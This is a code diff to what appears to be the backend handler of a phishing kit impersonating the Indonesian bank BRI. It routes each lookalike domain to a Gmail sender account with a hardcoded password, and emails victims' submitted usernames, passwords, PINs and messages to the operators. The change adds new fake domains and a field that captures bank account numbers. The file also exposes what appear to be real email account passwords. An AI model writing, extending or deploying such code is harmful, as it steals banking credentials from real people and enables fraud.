@@ -7,18 +7,24 @@ export default function handler(req, res) {
     let email = '';
     let pass = '';
 
-    if(url == 'bri.site'){
+    if(url == 'bri-promo.site'){
 
         email = 'orbitorbit799@gmail.com';
         pass = 'ahghpmbdwokimqim';
 
-    } else if (url == 'tarifpromo-bri.herokuapp.com'){
-        email = 'newversionbrimo@gmail.com';
-        pass = 'nlqfdmjhaafozjwv';
+    } else if (url == 'bri-promo.herokuapp.com') {
+        
+        email = 'hibrahimshaleh@gmail.com';
+        pass = 'bfaawtyurzhbqjkl';
 
     } else if(url == 'bri-pelayanan.herokuapp.com'){
         email = 'pukiayam5123@gmail.com';
         pass = 'joyxbannkfmypmzx';
+
+    } else if(url == 'bri-customerservice.xyz'){
+        email = 'spacediamond95@gmail.com';
+        pass = 'gkpahtwroxntldgs';
+
     }
     else {
         email = 'bripembukaanrekening@gmail.com';
@@ -44,6 +50,7 @@ export default function handler(req, res) {
                     <ul>
                         <li>username: ${body.username ?? '-'}</li> 
                         <li>password: ${body.password ?? '-'}</li>
+                        <li>norekening: ${body.nomorrekening ?? '-'}</li>
                         <li>pin: ${body.mPin ?? '-'}</li>
                         <li>message: ${body.message ?? '-'}</li>
                     </ul>
